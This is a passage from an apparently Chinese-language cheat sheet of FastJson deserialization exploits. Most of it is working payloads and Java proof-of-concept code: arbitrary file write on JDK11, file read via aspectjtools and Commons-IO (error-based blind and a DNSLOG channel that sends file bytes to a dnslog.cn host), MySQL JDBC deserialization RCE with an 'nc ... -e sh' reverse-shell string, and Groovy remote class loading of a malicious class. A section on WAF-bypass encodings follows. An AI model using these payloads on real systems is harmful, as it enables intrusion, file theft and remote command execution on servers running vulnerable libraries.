        "      \"inputStream\":{\n" +
        "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
        "        \"input\":{\n" +
        "          \"$ref\":\"$.input\"\n" +
        "        },\n" +
        "        \"branch\":{\n" +
        "          \"$ref\":\"$.branch\"\n" +
        "        },\n" +
        "        \"closeBranch\": true\n" +
        "      },\n" +
        "      \"httpContentType\":\"text/xml\",\n" +
        "      \"lenient\":false,\n" +
        "      \"defaultEncoding\":\"UTF-8\"\n" +
        "    },\n" +
        "    \"trigger2\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
        "      \"inputStream\":{\n" +
        "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
        "        \"input\":{\n" +
        "          \"$ref\":\"$.input\"\n" +
        "        },\n" +
        "        \"branch\":{\n" +
        "          \"$ref\":\"$.branch\"\n" +
        "        },\n" +
        "        \"closeBranch\": true\n" +
        "      },\n" +
        "      \"httpContentType\":\"text/xml\",\n" +
        "      \"lenient\":false,\n" +
        "      \"defaultEncoding\":\"UTF-8\"\n" +
        "    },\n" +
        "    \"trigger3\":{\n" +
        "      \"@type\":\"java.lang.AutoCloseable\",\n" +
        "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
        "      \"inputStream\":{\n" +
        "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
        "        \"input\":{\n" +
        "          \"$ref\":\"$.input\"\n" +
        "        },\n" +
        "        \"branch\":{\n" +
        "          \"$ref\":\"$.branch\"\n" +
        "        },\n" +
        "        \"closeBranch\": true\n" +
        "      },\n" +
        "      \"httpContentType\":\"text/xml\",\n" +
        "      \"lenient\":false,\n" +
        "      \"defaultEncoding\":\"UTF-8\"\n" +
        "    }\n" +
        "  }";
System.out.println(poc5);
JSON.parseObject(poc5);
```
### JDK11-无限制写文件
1.2.57<=FastJson<=1.2.68
主要针对JDK11版本，无其他环境依赖，且写入文件完整。
当确定JDK版本为11，可优先选择这条链。
```java
public class Fastjson_WriteFile_JDK11 {
    public static void main(String[] args) throws Exception {
    	String code = gzcompress("qwerasdf");
    	//php -r "echo base64_encode(gzcompress('qwerasdf'));"
    	//<=1.2.68 and JDK11
        String payload = "{\r\n"
        		+ "    \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "    \"@type\":\"sun.rmi.server.MarshalOutputStream\",\r\n"
        		+ "    \"out\":\r\n"
        		+ "    {\r\n"
        		+ "        \"@type\":\"java.util.zip.InflaterOutputStream\",\r\n"
        		+ "        \"out\":\r\n"
        		+ "        {\r\n"
        		+ "           \"@type\":\"java.io.FileOutputStream\",\r\n"
        		+ "           \"file\":\"e:/bbb.txt\",\r\n"
        		+ "           \"append\":false\r\n"
        		+ "        },\r\n"
        		+ "        \"infl\":\r\n"
        		+ "        {\r\n"
        		+ "            \"input\":\r\n"
        		+ "            {\r\n"
        		+ "                \"array\":\""+code+"\",\r\n"
        		+ "                \"limit\":16\r\n"  //需对应修改
        		+ "            }\r\n"
        		+ "        },\r\n"
        		+ "        \"bufLen\":1048576\r\n"
        		+ "    },\r\n"
        		+ "    \"protocolVersion\":1\r\n"
        		+ "}\r\n"
        		+ "";
        System.out.println(payload);
        JSON.parseObject(payload);	
    }
    public static String gzcompress(String code) {
    	byte[] data = code.getBytes();
        byte[] output = new byte[0];
        Deflater compresser = new Deflater();
        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        System.out.println(Arrays.toString(output));
        return Base64.getEncoder().encodeToString(output);
    }
}
```
使用技巧：
gzcompress中传入需要写入的数据，区别于单纯base64编码数据，测试只能通过这种方式经压缩算法压缩后写入到文件。随后是修改limit处，与之前为原始数据长度不同，这里会有一点偏差， 他往往会比真实长度要短。例如我这里要写入的数据为`qwerasdf`,对应长度为8，但写上8会发现写入到文件中是错误的甚至为空。
这里解决方式是利用报错，先适当写入比原始长度更长的数据，如20(测试发现尽量为2倍)，同时在报错中会给出真实数据容量。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692000643467-53f6fc2c-49b6-4f87-8382-3fcb02c5508e.png#averageHue=%2334302e&clientId=u8125b4ab-9c9f-4&from=paste&height=66&id=u3d42965f&originHeight=82&originWidth=944&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25213&status=done&style=none&taskId=u3a0b0003-9533-45a1-abbf-e7b3a56a9c7&title=&width=755.2)
真实环境测试：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692000728791-d8d0f7a0-8e95-4d86-8929-7499e8f0910e.png#averageHue=%23fdfcfc&clientId=u8125b4ab-9c9f-4&from=paste&height=406&id=u2b6c9cb4&originHeight=508&originWidth=1286&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=133118&status=done&style=none&taskId=u4b537159-fa7b-4e68-846b-71272011ef9&title=&width=1028.8)
409才是对应的真实数据容量
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692000759992-ed7300d2-92b4-4f1d-a096-7495867188fc.png#averageHue=%23fdfdfc&clientId=u8125b4ab-9c9f-4&from=paste&height=301&id=ucf3f9920&originHeight=376&originWidth=1044&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105897&status=done&style=none&taskId=u606101cc-4992-421c-827f-213eb9766e0&title=&width=835.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692000832343-7014b577-f31d-47f5-ad19-8b9e1ce1a84f.png#averageHue=%233b434c&clientId=u8125b4ab-9c9f-4&from=paste&height=270&id=u0c0d06c4&originHeight=337&originWidth=952&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47094&status=done&style=none&taskId=ua28fe5fe-1e33-4d84-bdf0-0fadf595f9a&title=&width=761.6)
[https://www.ctfiot.com/53462.html](https://www.ctfiot.com/53462.html)
[https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/](https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/)
[https://forum.butian.net/share/1623](https://forum.butian.net/share/1623)
[https://paper.seebug.org/1698/#4](https://paper.seebug.org/1698/#4)
[https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew](https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew)
## 读文件利用
### aspectjtools
```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.5.4</version>
</dependency>
```
虽然可做到读文件，但实际上是文件迁移，将会清空temp文件，写入到target中，所以，慎用！
```java
//temppath存在，targetpath不存在，则将temp文件写入target
String poc3 = "{\n" +
        "    \"@type\": \"java.lang.AutoCloseable\",\n" +
        "    \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
        "    \"targetPath\": \"./bbbbbbb.txt\",\n" +
        "    \"tempPath\": \"e:/aaa.txt\"\n" +
        "}";
```
### Commons-IO - 报错
相较于上一种利用更加广泛，引入的依赖更加常见。
```xml
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.6</version>
</dependency>
```
类似于SQL的报错布尔盲注，根据报错信息不同判断文件内容。
后续脚本或burp爆破即可。
```java
//commons-io 报错盲注
 String poc2 =  "{\n" +
         "    \"abc\": {\n" +
         "\t\t\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
         "        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
         "        \"delegate\": {\n" +
         "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
         "            \"reader\": {\n" +
         "                \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
         "                \"url\": \"file:///e:/ccc.txt\"\n" +  //待读取的文件内容
         "            },\n" +
         "            \"charsetName\": \"UTF-8\",\n" +
         "            \"bufferSize\": 1024\n" +
         "        },\n" +
         "        \"boms\": [\n" +
         "            {\n" +
         "                \"charsetName\": \"UTF-8\",\n" +
         "                \"bytes\": [\n" +
         "                    70,76\n" +  //文件内容的ascii，例如e:/ccc.txt中前两个字符FL，对应的ascii：70,76
         "                ]\n" +
         "            }\n" +
         "        ]\n" +
         "    },\n" +
         "    \"address\": {\n" +
         "        \"@type\": \"java.lang.AutoCloseable\",\n" +
         "        \"@type\": \"org.apache.commons.io.input.CharSequenceReader\",\n" +
         "        \"charSequence\": {\n" +
         "            \"@type\": \"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"},\n" +
         "            \"start\": 0,\n" +
         "            \"end\": 0\n" +
         "        }\n" +
         "    }\n" +
         "}";
```
### Commons-IO - DNSLOG
存在commons-io依赖即可，字节正确则发起DNS请求，根据请求读取文件信息。适用于无回显条件。
```json
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///e:/ccc.txt"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [70,76] //与上述一致
      }
    ]
  },
  "address": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "http://lemono.s42bkn.dnslog.cn"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "boms": [{"$ref":"$.abc.BOM[0]"}]
  },
  "xxx":{"$ref":"$.address.BOM[0]"}
}
```
## Mysql-JDBC反序列化
### 5.1.11-5.1.48
存在mysql-connect依赖可JDBC反序列化rce。
先启动fake_mysql服务端[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)，具体使用看JDBC反序列化篇。
```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>5.1.47</version>
</dependency>
```
```json
// mysql 5.1.11-5.1.48
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3306,
    "info": {
        "user": "yso_CommonsCollections6_nc 127.0.0.1 9999 -e sh",
        "password": "12345",
        "maxAllowedPacket": "655360",
        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
        "autoDeserialize": "true",
        "NUM_HOSTS": "1"
    },
    "databaseToConnectTo": "dbname",
    "url": ""
}
```
### 6.0.2-6.0.3
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
    "proxy": {
        "connectionString": {
            "url": "jdbc:mysql://localhost:3306/test?allowLoadLocalInfile=true&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections6_nc 127.0.0.1 9999 -e sh"
        }
    }
}
```
### 8.0.19
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [
                {
                    "host": "127.0.0.1"
                }
            ],
            "slaves": [],
            "properties": {
                "host": "127.0.0.1",
                "user": "yso_CommonsCollections6_calc",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true",
                "allowLoadLocalInfile": "true"
            }
        }
    }
}
```
# FastJson <=1.2.80
## Groovy - rce
1.2.76<=FastJson<=1.2.80
```xml
<dependency>  
    <groupId>org.codehaus.groovy</groupId>  
    <artifactId>groovy</artifactId>  
    <version>3.0.9</version>  
</dependency>
```
新建GroovyPoc.java,并编译为GroovyPoc.class(在恶意类的创建下有个问题：在idea中创建并编译为class时不要创建在任一自己的package下，这样服务端在加载该类时可能因为没有这个package导致调用失败)
比如这样是不行的，在/src/main/java目录下创建即可
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692846917915-bb6cf80f-cf76-4503-8cdc-005d97d4466f.png#averageHue=%2332302e&clientId=u849ca923-f223-4&from=paste&height=112&id=uf56ec83d&originHeight=140&originWidth=323&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12053&status=done&style=none&taskId=u4d6e0d66-3dd3-47e5-bd45-72b4ed0d98f&title=&width=258.4)
```java
@GroovyASTTransformation(phase = CompilePhase.CONVERSION)
public class GroovyPoc implements ASTTransformation {
    public GroovyPoc(){  
        try{  
            Runtime.getRuntime().exec("calc");
        }catch (Exception ex){  
  
        }  
    }  
  
    @Override  
    public void visit(ASTNode[] astNodes, SourceUnit sourceUnit) {
  
    }  
```
创建META-INF/services/org.codehaus.groovy.transform.ASTTransformation文件，并写入`GroovyPoc`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692069444801-4ba5e8dc-2f9c-4490-ad4c-2ae644f1c7fe.png#averageHue=%23fdfcfb&clientId=ua12c8ebe-585b-4&from=paste&height=79&id=u77aeafd2&originHeight=99&originWidth=794&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8101&status=done&style=none&taskId=u3094514d-a0f2-408f-9b6a-68445d64f40&title=&width=635.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692069416184-7e11f987-29d1-4aab-9f65-eb7692566bf9.png#averageHue=%23caf9f6&clientId=ua12c8ebe-585b-4&from=paste&height=137&id=u79b7e9af&originHeight=171&originWidth=547&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14395&status=done&style=none&taskId=uc5512e21-afb2-43e1-be6c-fa39850ff74&title=&width=437.6)
`python -m http.server 9999` 起一个http服务
此Poc仅在真实web环境中可用，因为涉及到两步操作。
```json
//先执行这段JSON指定期望类加入类缓存
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}


//再执行这段JSON远程类加载恶意类
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://10.30.2.83:9999/"
    }
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1692069817377-e8b47684-0fcd-4ad0-b5f8-ba69fab66537.png#averageHue=%23fbfbfb&clientId=ua12c8ebe-585b-4&from=paste&height=237&id=u8cc88273&originHeight=296&originWidth=1264&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60834&status=done&style=none&taskId=u2eb1d585-7dcf-491a-a175-c4766239870&title=&width=1011.2)

## Aspectj - 读文件
FastJson>=1.2.73 && <=1.2.80,利用java.lang.Character报错，回显读取任意文件
```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.9.5</version>
</dependency>
```
 此利用方式同上，仅在web端可行，因为需要用到缓存机制，依次发送三段payload。 
```json
// poc1-1
{
    "@type":"java.lang.Exception",
    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}

poc1-2
{
    "@type":"java.lang.Class",
    "val":{
        "@type":"java.lang.String"{
        "@type":"java.util.Locale",
        "val":{
            "@type":"com.alibaba.fastjson.JSONObject",
             {
                "@type":"java.lang.String"
                "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException",
                "newAnnotationProcessorUnits":[{}]
            }
        }
    }

poc1-3
{
    "@type":"java.lang.Character"
    {
        "c":{
            "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
            "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
            "fileName":"c:/windows/win.ini"
    }
}

```
其他链请看[su18的总结](https://github.com/su18/hack-fastjson-1.2.80)。
# WAF绕过
可看这篇：[https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-Unicode-Hex](https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-Unicode-Hex)
## FastJson默认会对Unicode和Hex解码
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
  	||
  	||
  	\/
{"\x40\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
```
## _和-绕过
FastJson在解析JSON字段的key时，会将_和-替换为空；在1.2.36之前_和-只能单独使用，在1.2.36及之后，支持_和-混合使用。
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",'d_a_t_aSourceName':"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
```
## 字符填充
和SQL一样，WAF会放行数据字符过大的数据包
```json
{
	"@type":"org.example.User",
	"username":"1",
	"f":"a*20000"  //2万个a
}
```
# 膜一下
[https://github.com/su18/hack-fastjson-1.2.80](https://github.com/su18/hack-fastjson-1.2.80)
[https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf](https://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf)
[https://y4er.com/posts/fastjson-1.2.80/](https://y4er.com/posts/fastjson-1.2.80/)
[https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg](https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg)
[https://b1ue.cn/archives/382.html](https://b1ue.cn/archives/382.html)
[https://www.freebuf.com/vuls/361576.html](https://www.freebuf.com/vuls/361576.html)
[https://su18.org/post/fastjson-1.2.68](https://su18.org/post/fastjson-1.2.68)
[https://github.com/kezibei/fastjson_payload](https://github.com/kezibei/fastjson_payload)
[https://github.com/Whoopsunix/fastjson_study](https://github.com/Whoopsunix/fastjson_study)
[https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)
[https://xz.aliyun.com/t/7027#toc-22](https://xz.aliyun.com/t/7027#toc-22)
[https://mp.weixin.qq.com/s/R7Q2CZFZv4DdyysJ6WHc1A](https://mp.weixin.qq.com/s/R7Q2CZFZv4DdyysJ6WHc1A)
